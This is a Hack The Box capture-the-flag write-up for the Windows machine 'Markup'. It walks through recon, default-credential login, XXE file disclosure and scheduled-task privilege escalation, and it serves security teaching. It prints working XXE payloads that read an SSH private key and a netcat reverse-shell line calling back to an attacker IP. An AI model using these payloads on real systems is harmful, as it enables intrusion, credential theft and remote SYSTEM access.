# Markup

<p align="center">
  <img src="image.png" alt="image.png" width="300">
</p>

# Table of Contents
- [Context](#context)
- [Scenario](#scenario)
- [Tasks](#tasks)
- [User Flag Walkthrough](#user-flag-walkthrough)
  * [Basic XXE](#basic-xxe)
- [Root Flag Walkthrough](#root-flag-walkthrough)
- [Attack Chain](#attack-chain)
  * [Attack Tree](#attack-tree)
- [Artifacts](#artifacts)
- [Lab Insights](#lab-insights)

# Context

Lab link: [https://app.hackthebox.com/machines/Markup](https://app.hackthebox.com/machines/Markup)

Suggested tools: Burp Suite, `curl`, `icacls`, `certutil`, `nc64.exe`

# Scenario

Markup is a very easy Windows machine that explores XML External Entity (XXE) vulnerabilities, insecure file permissions and misconfigured scheduled tasks. A vulnerable web application allows for user-supplied XML input to be parsed allowing the retrieval of sensitive files on the host machine, including the user's private SSH key. Privilege escalation can be achieved by identifying and overwriting a scheduled batch script with insecure permissions to execute a reverse shell.

# Tasks

Q1- What version of Apache is running on the target's port 80?

Answer: `2.4.41`

Reason: Nmap version scan against `10.129.95.192` identified Apache HTTP Server (httpd) version `2.4.41` running on port `80`, compiled for Win64 and linked against `OpenSSL/1.1.1c` and `PHP/7.2.28`. The HTTP response also revealed a site titled "`MegaShopping`." This version and build combination narrows the target to a Windows host, and the specific Apache/PHP/OpenSSL version triple is useful for cross-referencing known CVEs against this exact stack (T1595.002, Active Scanning: Vulnerability Scanning).

```bash
$ nmap -v -sC -sV 10.129.95.192

80/tcp  open  http     Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28
|_http-title: MegaShopping
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
```

Q2- What username:password combination logs in successfully?

Answer: `admin`:`password`

Reason: A login attempt against the MegaShopping web application on `10.129.95.192:80` succeeded using the credentials `admin:password`, granting authenticated access on the first attempt. This confirms the application uses weak, unchanged default credentials, a common misconfiguration that provides an immediate foothold without requiring any exploitation of the underlying stack (T1078.001, Valid Accounts: Default Accounts).

![image.png](image%201.png)

Q3- What is the word at the top of the page that accepts user input?

Answer: `Order`

Reason: After authenticating, the navigation bar displayed the options Home, About, Products, Order, and Contact. Selecting Order led to a page titled "Order in Bulk" containing a form with fields for Type of Goods, Quantity, and Address that accepts user-supplied input. This form is a likely candidate for XML External Entity (XXE) injection, given the box's known XML-parsing vulnerability, since the Order in Bulk feature suggests the backend processes structured data, potentially XML, submitted through these fields (T1190, Exploit Public-Facing Application).

![image.png](image%202.png)

Q4- What XML version is used on the target?

Answer: `1.0`

Reason: Intercepting the Order form submission in Burp Suite revealed that the request is sent as a `POST` to `/process.php` with a `Content-Type` header of `text/xml`. The request body begins with the declaration `<?xml version = "1.0"?>`, confirming the XML version consumed by the backend parser, followed by an `<order>` element containing `<quantity>`, `<item>`, and `<address>` fields. This confirms the endpoint accepts raw, user-influenced XML directly, making it a concrete candidate for XXE injection testing (T1190, Exploit Public-Facing Application).

```bash
POST /process.php HTTP/1.1
Host: 10.129.95.192
Content-Length: 110
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Content-Type: text/xml
Accept: */*
Origin: http://10.129.95.192
Referer: http://10.129.95.192/services.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=btgmgveonq08c96peesovpmqd6
Connection: keep-alive

<?xml version = "1.0"?><order><quantity>2</quantity><item>Home Appliances</item><address>222</address></order>
```

Q5- What does the XXE / XEE attack acronym stand for?

Answer: XML External Entity

Reason: XML External Entity (XXE) is a vulnerability class in which an XML parser with external entity resolution enabled processes a maliciously crafted `DOCTYPE`/`ENTITY` declaration supplied by an attacker. If successful, this can allow local file disclosure, Server-Side Request Forgery (SSRF), or, in some cases, Remote Code Execution (RCE). This is directly applicable to `/process.php`, which was confirmed to parse raw, attacker-supplied XML without apparent restriction on entity declarations.

Q6- What username can we find on the webpage's HTML code?

Answer: `Daniel`

Reason: Reviewing the raw HTML source of each page revealed no useful artifacts until `services.php` (the Order page), which contained a leftover developer comment in the `<head>` section: `<!-- Modified by Daniel : UI-Fix-9092-->`. This is a case of unintentional attribution, an inline comment left by a developer during a UI change that discloses a plausible real system username, `Daniel`, aligning with the challenge hint that "giving credit is not always a good idea." This username is a candidate worth testing later against SSH or other authentication mechanisms exposed by the target (T1589.001, Gather Victim Identity Information: Credentials).

Q7- What is the file located in the Log-Management folder on the target?

Answer: `job.bat`

Reason: With shell access as `daniel`, listing `C:\Log-Management` directly, now trivial with a real filesystem shell instead of relying on blind XXE reads, revealed a single file: `job.bat`, sized 346 bytes. This is a strong lead for the box's described privilege escalation vector, likely a misconfigured scheduled task or batch script running with elevated privileges that references or executes this file.

```powershell
daniel@MARKUP C:\Log-Management>dir 
 Volume in drive C has no label. 
 Volume Serial Number is BA76-B4E3

 Directory of C:\Log-Management

03/12/2020  03:56 AM    <DIR>          .
03/12/2020  03:56 AM    <DIR>          ..
03/06/2020  02:42 AM               346 job.bat
               1 File(s)            346 bytes
               2 Dir(s)   7,374,589,952 bytes free
```

Q8- What executable is mentioned in the file mentioned before?

Answer: `wevtutil.exe`

Reason: Reading the contents of `job.bat` with `type C:\Log-Management\job.bat` revealed it invokes `wevtutil.exe` inside a `for /F` loop to enumerate and clear Windows Event Logs. This is consistent with a scheduled task that periodically runs the script to purge event logs, and is worth checking for insecure write permissions, since any modification to `job.bat` would execute with whatever privileges the scheduling account holds (T1053.005, Scheduled Task/Job: Scheduled Task).

```bash
daniel@MARKUP C:\Log-Management>type job.bat
@echo off 
FOR /F "tokens=1,2*" %%V IN ('bcdedit') DO SET adminTest=%%V
IF (%adminTest%)==(Access) goto noAdmin
for /F "tokens=*" %%G in ('wevtutil.exe el') DO (call :do_clear "%%G")
echo.
echo Event Logs have been cleared!
goto theEnd
:do_clear
wevtutil.exe cl %1
goto :eof
:noAdmin
echo You must run this script as an Administrator!
:theEnd
exit
```

# User Flag Walkthrough

1- Leaking a username via HTML source review: crawling each page's raw HTML source manually turned up a developer comment `<!-- Modified by Daniel : UI-Fix-9092-->` in `services.php`, revealing the username `Daniel`.

2- Confirming the XXE injection point: the Order form's JS posted raw XML to `/process.php`, and intercepting the request in Burp Suite showed the exact structure (`<?xml version="1.0"?><order><quantity>...</quantity><item>...</item><address>...</address></order>`), confirming an editable, parser-driven endpoint.

```xml
<?xml version = "1.0"?>
  <!DOCTYPE order [
  <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
  ]>
  <order><quantity>2</quantity><item>&xxe;</item><address>222</address>
  </order>

<?xml version = "1.0"?>
	<!DOCTYPE order [
	<!ENTITY xxe SYSTEM "file:///C:/Users/Daniel/.ssh/id_rsa">
	]>
	<order><quantity>2</quantity><item>&xxe;</item><address>222</address>
	</order>
```

3- Testing external entity resolution: injecting a `DOCTYPE` with `<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">` and referencing `&xxe;` inside `<item>` caused the server to echo back the contents of `win.ini`, confirming the box was vulnerable to classic XXE file disclosure.

4- Ruling out directory listing: attempts to list directory contents via `file:///C:/Users/` and PHP's `glob:///C:/*` wrapper both failed, `libxml2` doesn't render directory indexes for `file://`, and `DOMDocument::loadXML()`'s entity loader can't open `glob://` since it isn't a standard readable stream, confirming file reads were limited to exact known paths only.

5- Reading Daniel's SSH private key: guessing the default Windows OpenSSH key location, `file:///C:/Users/Daniel/.ssh/id_rsa`, successfully returned the full private key contents via the XXE response.

6- Authenticating over SSH: saving the key, setting `chmod 600`, and running `ssh -i id_rsa daniel@10.129.95.192` dropped into an authenticated shell as `daniel`.

7- Retrieving the user flag: listing `C:\Users\daniel\Desktop` showed `user.txt` (35 bytes), captured as the user flag.

## Basic XXE

The core primitive is a `DOCTYPE` declaration defining an external entity backed by a `SYSTEM` identifier pointing to a `file://` path, with that entity referenced inside a field the application already trusts as user-controlled data.

```xml
<?xml version = "1.0"?>
<!DOCTYPE order [
<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
]>
<order><quantity>2</quantity><item>&xxe;</item><address>222</address>
</order>
```

The parser resolves `&xxe;` at parse time, substituting the file contents directly into the `<item>` node before the application echoes or processes the order, which is how the response leaks the raw file back to you. The technique generalizes to any known, exact path readable by the service account, as shown by pivoting from `win.ini` (proof of concept) to `C:/Users/Daniel/.ssh/id_rsa` (credential harvest):

```xml
<?xml version = "1.0"?>
<!DOCTYPE order [
<!ENTITY xxe SYSTEM "file:///C:/Users/Daniel/.ssh/id_rsa">
]>
<order><quantity>2</quantity><item>&xxe;</item><address>222</address>
</order>
```

Two prerequisites make this exploitable: the parser must have external entity resolution enabled (no `libxml_disable_entity_loader` or equivalent hardening), and the endpoint must reflect or process the resolved value somewhere visible to you. No directory listing capability comes for free, `file://` doesn't enumerate, so exploitation depends on guessing exact paths, defaults like OpenSSH key locations are the highest-value first guesses.

# Root Flag Walkthrough

1- Confirming the privesc vector: `icacls job.bat` showed `BUILTIN\Users:(F)` (Full Control) alongside `NT AUTHORITY\SYSTEM:(I)(F)`, indicating any authenticated user could overwrite a script that a SYSTEM-level scheduled task executes.

```powershell
daniel@MARKUP C:\Log-Management>icacls job.bat
job.bat BUILTIN\Users:(F)
        NT AUTHORITY\SYSTEM:(I)(F)
        BUILTIN\Administrators:(I)(F)
        BUILTIN\Users:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

2- Encountering a reset obstacle: overwriting `job.bat` initially appeared to work but was found to periodically revert to its original contents, requiring a persistent retry loop (`for /L` with a 2-second timeout) to continuously re-assert the payload until it landed in the narrow window before the scheduled task executed.

```powershell
daniel@MARKUP C:\Log-Management>(echo C:\Log-Management\nc64.exe -e cmd.exe 10.10.14.85 1234   1>C:\Log-Management\j
ob.bat  & timeout /t 2  1>nul )
```

3- Catching the SYSTEM shell: once the payload survived long enough to execute, `nc64.exe -e cmd.exe 10.10.14.85 1234` connected back to the listener, dropping a shell running as `NT AUTHORITY\SYSTEM` (confirmed by direct access to `C:\Users\Administrator\Desktop`).

4- Capturing root flag: `type root.txt` in `C:\Users\Administrator\Desktop` returned the flag.

Note: `nc64.exe` was downloaded and then uploaded to the box using `python` HTTP server.

# Attack Chain

| Time (UTC) | Stage | Detail | MITRE |
| --- | --- | --- | --- |
| N/A | Reconnaissance | `nmap -sC -sV` on `10.129.95.192` identifies Apache 2.4.41 (Win64, PHP 7.2.28), SSH (OpenSSH for_Windows_8.1), MegaShopping site | T1595 |
| N/A | Initial Access (web) | Logged into MegaShopping with default creds `admin:password` | T1078 |
| N/A | Reconnaissance | HTML comment `<!-- Modified by Daniel : UI-Fix-9092-->` found in `services.php` source, leaking username Daniel | T1594 |
| N/A | Initial Access (XXE) | Crafted `DOCTYPE`/`ENTITY` XML sent to POST `/process.php`, resolved `file:///C:/Windows/win.ini`, confirming XXE | T1190 |
| N/A | Credential Access | XXE read `file:///C:/Users/Daniel/.ssh/id_rsa`, leaking Daniel's full SSH private key | T1552.004 |
| N/A | Initial Access (shell) | `ssh -i id_rsa daniel@10.129.95.192` — authenticated shell as daniel | T1021.004 |
| N/A | Discovery | `icacls job.bat` showed `BUILTIN\Users:(F)` + `SYSTEM:(I)(F)`, revealing writable script run by a SYSTEM-context scheduled task | T1057 |
| N/A | Persistence/Privesc setup | `job.bat` repeatedly overwritten with `nc64.exe -e cmd.exe <attacker_ip> 1234` via `cmd.exe` retry loop to survive an observed periodic file reset | T1053.005 |
| N/A | Privilege Escalation | Scheduled task executed poisoned `job.bat` as SYSTEM, connecting back to `nc -lvnp 1234` | T1053.005 |
| N/A | Collection | Read `C:\Users\daniel\Desktop\user.txt` and `C:\Users\Administrator\Desktop\root.txt` | T1005 |

## Attack Tree

```xml
HTB Markup (10.129.95.192)
│
├── 80/443 -- Apache/PHP (XAMPP) MegaShopping site
│   └── admin:password login
│       └── services.php HTML comment leaks username "Daniel"
│           └── POST /process.php -- XXE via DOCTYPE/SYSTEM entity
│               └── file:///C:/Windows/win.ini read (confirms XXE)
│                   └── file:///C:/Users/Daniel/.ssh/id_rsa read
│                       └── ssh -i id_rsa daniel@10.129.95.192
│                           │
│                           ├── C:\Users\daniel\Desktop\user.txt
│                           │   └── [USER FLAG]
│                           │
│                           └── C:\Log-Management\job.bat -- icacls: Users(F), SYSTEM(F)
│                               └── retry-loop overwrite: nc64.exe -e cmd.exe 10.10.14.85 1234
│                                   └── scheduled task executes job.bat as SYSTEM
│                                       └── nc -lvnp 1234 catches SYSTEM shell
│                                           └── C:\Users\Administrator\Desktop\root.txt
│                                               └── [ROOT FLAG]
```

# Artifacts

| Category | Item | Value | Notes |
| --- | --- | --- | --- |
| Host | Target IP | `10.129.95.192` | HTB Markup |
|  | Attacker IP (tun0) | `10.10.14.85` | HTB VPN interface |
| Port | 80/443 | Apache 2.4.41 (Win64), XAMPP, PHP 7.2.28 | MegaShopping site |
|  | 22 | OpenSSH for_Windows_8.1 | Used for foothold shell |
|  | 1234 | nc listener | Reverse shell catch |
| Credential | admin:password | Web login | Default creds guess |
|  | daniel | SSH private key | Leaked via XXE at `C:\Users\Daniel\.ssh\id_rsa` |
| File | `services.php` | Web root | Contained `<!-- Modified by Daniel : UI-Fix-9092-->` |
|  | `process.php` | `C:\xampp\htdocs\process.php` | Vulnerable XXE sink (`DOMDocument::loadXML`) |
|  | `job.bat` | `C:\Log-Management\job.bat` | Insecure ACL, SYSTEM-run scheduled task target |
|  | `nc64.exe` | `C:\Log-Management\nc64.exe` | Staged via certutil from `python3 http.server` |
| Flag | `user.txt` | `C:\Users\daniel\Desktop\user.txt` | Captured |
|  | `root.txt` | `f574a3e7650cebd8c39784299cb570f8` | Captured |
| Tool | Burp Suite | Intercepted/edited raw XML POST body for XXE payload |  |
|  | curl | Used for cookie-jar session auth reference |  |
|  | icacls | Revealed `job.bat`'s insecure ACL |  |
|  | certutil | Downloaded `nc64.exe` to target |  |
|  | nc/nc64.exe | Reverse shell listener + `-e cmd.exe` payload |  |

# Lab Insights

1. XML parsing that trusts client-supplied input is rarely limited to the field it appears to control — a DOCTYPE declaration injected ahead of the intended payload can redefine how the entire document is interpreted, turning a business form into an arbitrary local file-read primitive. In this engagement, the Order form's quantity/item/address fields were meant to hold order details, but because process.php parsed raw client XML with DOMDocument::loadXML() and no libxml_disable_entity_loader() protection, a SYSTEM entity smuggled into the request body let us pull win.ini and ultimately Daniel's SSH private key straight off disk (T1190).
2. Storing a private key at a predictable, conventional path is often more valuable to an attacker than the key's cryptographic strength — key management schemes lean on filesystem access control to protect secrets at rest, and any read primitive that bypasses that control (regardless of how it was obtained) defeats the protection entirely. Here, guessing the default Windows OpenSSH location C:\Users\Daniel\.ssh\id_rsa required no brute-forcing of the key itself, only knowledge of a well-known convention paired with the XXE read (T1552.004).
3. A scheduled task's true danger is rarely the task definition itself but the writability of whatever it executes — access controls are meaningful only when every artifact in the execution chain is protected, and a task running as SYSTEM is only as safe as the least-privileged file it touches. job.bat inheriting BUILTIN\Users:(F) alongside SYSTEM:(I)(F) meant the task's elevated context could be hijacked by any authenticated user simply by rewriting the file's contents, without ever needing visibility into the task itself (T1053.005).
